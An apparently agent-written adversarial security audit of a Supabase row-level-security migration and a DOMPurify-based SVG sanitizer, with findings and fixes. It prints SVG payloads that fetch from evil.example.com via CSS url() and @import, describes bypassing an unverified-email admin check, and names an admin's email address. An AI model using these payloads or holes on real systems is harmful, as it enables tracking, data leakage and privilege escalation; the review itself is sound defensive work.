# R1 — Security Review (adversarial)

Scope: `supabase/migrations/20250101000004_org_admin.sql` (RLS + storage) and
`src/lib/svg/sanitizeSvg.js` (+test). Audited against `docs/org-admin-mvp.md`
§3 (non-negotiables) and §4 (RLS/storage). Attacker assumed.

DOMPurify version in tree: **3.4.11**. All sanitizer findings below were
reproduced empirically under jsdom (the project's own test env).

---

## A. RLS + storage — `20250101000004_org_admin.sql`

### Findings

**BLOCKER — sql:129-136 (`is_platform_admin()`) — Platform-admin gate keyed on the RAW, UNVERIFIED JWT email claim. §3 + task item 5 require it keyed on the *verified* email; it is not.**
- Why exploitable: `is_platform_admin()` returns true iff `p.email = auth.email()`. `auth.email()` is simply the `email` claim from the request JWT (`request.jwt.claims->>'email'`) — it carries **no** verification. The migration ships its own verified-email reader `jwt_email_verified()` (sql:94-101) and correctly gates the membership-claim path (`claim_memberships`, sql:152-154) on it — but **does not** apply it to this, the highest-privilege gate. The asymmetry is the tell: the author knew presence ≠ verified, defended the low-priv path, and left the high-priv path on a bare string match. Consequence: anyone who can mint/obtain a JWT whose `email` claim equals `majed.bg@gmail.com` **without** confirming that address (e.g. via the Supabase email/password provider when "confirm email" is not enforced, or any path that sets the claim pre-verification) passes `is_platform_admin()` and can **create/edit any org** (orgs INSERT/UPDATE) and **write the global `materials` catalog**. §3 states the RLS policy — not a dashboard toggle — is the boundary; here the only thing closing the hole is the external "require email confirmation" setting, which code does not enforce and which `claim_memberships` already defends in depth while this gate does not.
- Concrete fix: `is_platform_admin()` body →
  `select exists (select 1 from public.platform_admins p where p.email = auth.email()) and public.jwt_email_verified();`
  (Do NOT also need it on `is_org_member`/`is_org_admin` — those key on `user_id`, which is only ever set by the already-verified `claim_memberships` flow.) Also make `jwt_email_verified()` robust to a missing claim (see NIT) so it fails closed.

**MEDIUM — sql:267-272 (storage update/delete owner) + sql:74 path convention — Storage object-path `org_id` is attacker-controlled and not bound to the row's true org, enabling cross-org admin *read* of a victim's SVG by path-prefix spoof is NOT possible (admin read keyed on foldername org), but a member can write an object whose `<org_id>` folder is an org they belong to while the `submissions` row claims a different org — i.e. the storage path org and the DB row org can diverge.**
- Why: `submissions storage insert owner` (sql:260-266) checks `is_org_member(foldername[1])`. The `submissions` INSERT policy (sql:225-227) checks `is_org_member(org_id)` independently. Nothing ties `svg_path`'s folder to `submissions.org_id`. A user who is a member of org A and org B can upload to `A/<id>.svg` but file the submission row under `org_id = B`. Admin of B then sees a row whose SVG lives under A's prefix; admin of B *cannot* read it (storage read is keyed on A's org-admin), so the job's artifact is unreadable by the only admin who can see the row. Conversely the A-admin can read the SVG but not the row. This is a data-integrity / job-loss vector and a mild confused-deputy, not a direct cross-tenant disclosure. App-layer always writes `<org_id>/<submission_id>.svg` so it's not hit in the happy path, but RLS — the stated boundary — does not enforce it.
- Fix: enforce path binding in the submissions INSERT policy, e.g. `with check (... and svg_path like org_id::text || '/%')`, or add a DB trigger asserting `split_part(svg_path,'/',1) = org_id::text`. Storage-side, the insert policy can't see the DB row, so the DB side must own this invariant.

**LOW — sql:251-259 — Storage READ allows any org-admin of the folder's org to read every object under that prefix, including objects owned by other members.** This is intended per spec ("read if owner or `is_org_admin(org_id)`"). Noted only because it depends entirely on the uploader honestly using their real org as the path prefix; combined with the MEDIUM above, a malicious member could place an object under an org they admin to read-gate it to themselves. Acceptable for MVP; resolved by the same path-binding fix.

**LOW — sql:156-163 (`claim_memberships`) — the `user_id`-fill paths ARE correctly gated by `jwt_email_verified()` (sql:152-154).** This is the §3 invite-hijack guard and it is present and correct *for the claim flow*. Called out for contrast: the same guard is missing on `is_platform_admin()` (see BLOCKER above). Note that even with the BLOCKER fix, the platform-admin *grant of effect* doesn't actually require the `user_id` claim — `is_platform_admin()` works purely off the email claim — so verification must live inside `is_platform_admin()` itself, not be assumed from the claim flow.

**NIT — sql:94-101 — `jwt_email_verified()` is `language sql stable` with NO `set search_path`.** It only calls `auth.jwt()` and does no table access, so search_path injection is low-risk, but for consistency it should `set search_path = public` (or `= ''`). It does fail closed (`coalesce(..., false)`), which is correct — important now that the BLOCKER fix makes the platform-admin gate depend on it.

### Verified SAFE (A)

1. **Cross-member submission leak — SAFE.** `submissions member own` (select), `member update own`, `member delete own` all gate on `submitted_by = auth.uid()`, and `member insert own` requires `submitted_by = auth.uid() AND is_org_member(org_id)`. A member cannot read/update/delete another member's submission. Admin read is separate (`admin read org`) and admin update is separate (`admin update org`) — no member path widens to siblings.
2. **Cross-org admin — SAFE.** Every admin policy (`org_members admin all`, `org_materials write admin`, `submissions admin read/update org`) is parameterized by the row's `org_id` via `is_org_admin(org_id)`, which checks an *active is_admin* membership for `auth.uid()` in that specific org. Admin of A gets false for B's rows. No cross-org reach.
3. **Org write gate — STRUCTURE safe, GATE broken.** `orgs` INSERT and UPDATE both route through `is_platform_admin()` only, with matching `WITH CHECK`, and there is no DELETE policy (no client delete path) — the policy *wiring* is correct and has no side path. BUT the function it depends on accepts an unverified email claim (see BLOCKER). So the gate is structurally sound but cryptographically/semantically open until `is_platform_admin()` is fixed. Same caveat applies to `materials write platform` (sql:207-210).
4. **platform_admins — SAFE.** Only a SELECT policy exists (`read own`: `email = auth.email() OR user_id = auth.uid()`). No INSERT/UPDATE/DELETE policy ⇒ with RLS enabled, all client writes are denied by default. A user cannot read another user's row (predicate is self-scoped). Writes happen only via the SECURITY DEFINER `claim_memberships()` (user_id fill) and the seed.
5. **SECURITY DEFINER helpers — PARTIALLY safe; one BLOCKER (see above).** `is_org_member`, `is_org_admin`, `is_platform_admin`, `claim_memberships` are all `security definer` with `set search_path = public` (good — no search_path injection). `is_org_member`/`is_org_admin` correctly key on `auth.uid()` and an *active* membership ⇒ SAFE. `claim_memberships` correctly uses `auth.uid()`+`auth.email()` and refuses to act unless `jwt_email_verified()` ⇒ the §3 invite-hijack guard, present and correct. **BUT `is_platform_admin()` keys on the unverified `auth.email()` with no `jwt_email_verified()` check — see BLOCKER. Not safe.**
6. **on-delete invariants — SAFE per spec.** `submissions.design_id → ON DELETE SET NULL` (sql:73), `org_material_id → ON DELETE RESTRICT` (sql:70). Removing a member: roster removal is a delete of an `org_members` row, which has no FK from `submissions`, so submissions are untouched (matches §3 "removing a member does NOT cascade-delete submissions"). NOTE: `submissions.submitted_by → profiles(id) ON DELETE CASCADE` (sql:69) — deleting the *profile* cascades the jobs; that's profile-deletion, not member-removal, and is consistent with spec which only protects against roster removal.
7. **RLS ENABLED on every new table — SAFE.** All six new tables have `enable row level security` (sql:169-174). Every INSERT/UPDATE policy carries a `WITH CHECK` (orgs insert/update, org_members all, materials write, org_materials write, submissions insert/update both member & admin). No write-bypass via missing `WITH CHECK`.

---

## B. Sanitizer — `src/lib/svg/sanitizeSvg.js`

### Findings

**HIGH — sanitizeSvg.js:31-41 (afterSanitizeAttributes hook) + :53-61 — CSS-based remote references are NOT neutralized. `<style>` blocks and inline `style="…"` attributes survive with `url(http://evil…)` and `@import url(http://evil…)` intact.**
- Why exploitable: The module's own stated threat model (lines 14-17) is "a stored SVG that fetches `http://evil/track.png` is a tracking-pixel / data-exfiltration vector, so we neutralize any non-local reference." But the hook only inspects the attributes `href`/`xlink:href`/`src` (`REFERENCE_ATTRS`, line 18). It never looks at CSS. DOMPurify's SVG profile *keeps* `<style>` and the `style` attribute, and does not strip remote `url()`/`@import` from CSS (it blocks `expression()` and JS, not plain remote fetches). Reproduced empirically (dompurify 3.4.11, jsdom):
  - `<style>@import url(http://evil.example.com/x.css);</style>` → survives, `removed: []`.
  - `<style>rect{fill:url(http://evil.example.com/p.png)}</style>` → survives, `removed: []`.
  - `<svg style="background:url(http://evil.example.com/p.png)">` → survives, `removed: []`.
  - `<rect style="fill:url(http://evil.example.com/p.png)"/>` → survives, `removed: []`.
  When this SVG is rendered (inline or via an `<img>`/CSS that allows external CSS fetches) the browser issues the remote request — exactly the exfil/track vector the file claims to close. `@import` additionally pulls a whole remote stylesheet. Beacon-on-render and IP/UA leakage of the admin reviewing the queue.
- Concrete fix: in the `afterSanitizeAttributes` hook, also sanitize CSS:
  (a) if `node.nodeName === 'style'`, scrub its `textContent` of any `url(...)` / `@import` whose target is not a `#fragment` (or drop the whole `<style>` — SVG snapshots for cutting do not need author stylesheets);
  (b) if the node has a `style` attribute, reject/strip declarations containing `url(` with a non-`#` target.
  Simplest robust option: add `FORBID_TAGS: ['style']` and `FORBID_ATTR: ['style']` to the `sanitize()` config (cut geometry uses presentation attributes like `fill`/`stroke`, not CSS), OR set DOMPurify's `SANITIZE_NAMED_PROPS`/use a CSS-aware pass. Given the cut/plot domain, forbidding `<style>` + `style` is the clean call.

**MEDIUM — sanitizeSvg.js:23-26 (`isLocalReference`) / test:131-141 — `data:` references are stripped wholesale, including legitimate `data:image/png;base64,…` raster fills.** Not a security hole (fail-closed), but a correctness regression: a perfectly safe embedded PNG/JPEG in an uploaded SVG silently loses its image. Confirmed: `<image href="data:image/png;base64,…"/>` → href removed. If embedded rasters are expected in member uploads this will mangle jobs. Spec §3/§5 don't require data: support, so LOW-severity on its own — flagged so the team chooses intentionally. Fix (if rasters wanted): allowlist `data:image/(png|jpeg|gif|webp)` in `isLocalReference`, keep stripping `data:image/svg+xml` (the script-smuggling case the test guards) and all other schemes.

**NIT — sanitizeSvg.js:29,51 — `externalRefRemovals` is module-level mutable state reset at the top of `sanitizeSvg()`.** Not reentrant; fine for synchronous single-threaded JS but fragile if ever called re-entrantly. No exploit.

### Verified SAFE (B)

- **`<script>` — stripped** (DOMPurify SVG profile; test:36-47 passing).
- **Event handlers (`onload`/`onclick`/`onerror`) — stripped** (test:49-61, :144-167).
- **`<foreignObject>` — stripped with contents** (the HTML-injection bridge; test:63-81).
- **`javascript:` in `href`/`xlink:href`, incl. whitespace/entity-obfuscated (`  javascript:`, `jav&#9;ascript:`) — neutralized.** DOMPurify's URI policy plus the non-`#` hook both remove it; reproduced.
- **Remote `http(s)://`, scheme-relative `//host`, path refs on `href`/`xlink:href`/`src` — stripped by the hook** across `<image>`, `<use>`, `<a>`, `<feImage>`, `<pattern><image>`. The hook's `startsWith('#')` allowlist is correct: only same-doc fragments survive.
- **Same-document `#fragment` (`<use href="#r">`) — preserved, no remote hole** (test:96-106). When both a `#x` and an external `xlink:href` are present on one `<use>`, the external one is stripped and the fragment kept (reproduced) — no fragment→remote upgrade.
- **SMIL animation re-targeting — SAFE.** `<animate attributeName="xlink:href" to="javascript:…">` and `<set attributeName="href" to="javascript:…">` are **removed entirely** (element + attrs) by DOMPurify's SVG profile — reproduced (`removed: ["element <animate>", …]`). The classic SMIL mutation-XSS vector is closed.
- **`ADD_TAGS:['use']` re-opens nothing.** `<use>` is re-allowed but its `href`/`xlink:href` runs through the same non-`#` hook, so a `<use>` pointing at a remote SVG document is stripped (test:108-118, reproduced). No new hole.

---

## VERDICT

**FINDINGS-MUST-FIX** — one BLOCKER + two HIGH:
- **SQL BLOCKER:** `is_platform_admin()` (sql:129-136) keys on the **unverified** `auth.email()` claim — §3 + item 5 require *verified*. Anyone with a JWT whose email claim = `majed.bg@gmail.com` (unconfirmed) gets full platform-admin: create/edit any org, write the global materials catalog. Fix: `... and public.jwt_email_verified()`.
- **Sanitizer HIGH:** CSS remote references (`<style>` / inline `style` `url()` / `@import`) are **not** neutralized — directly defeats the module's own stated anti-exfiltration goal. Forbid `<style>`+`style` or CSS-scrub in the hook. (Empirically reproduced, dompurify 3.4.11.)
- **SQL MEDIUM→HIGH-adjacent:** storage-path `<org_id>` ↔ submissions row `org_id` not bound in RLS (confused-deputy / job-loss). Bind in the submissions INSERT policy or a trigger.

Everything else (cross-member, cross-org admin reach, platform_admins client-write denial, RLS-enabled on all 6 tables, WITH CHECK coverage, on-delete invariants, search_path on the definer helpers, and the full sanitizer XSS surface — script/handler/foreignObject/SMIL animate+set/javascript:+obfuscation/remote-href across image/use/a/feImage/pattern/`#fragment`-preservation/`ADD_TAGS:['use']`) verified SAFE.
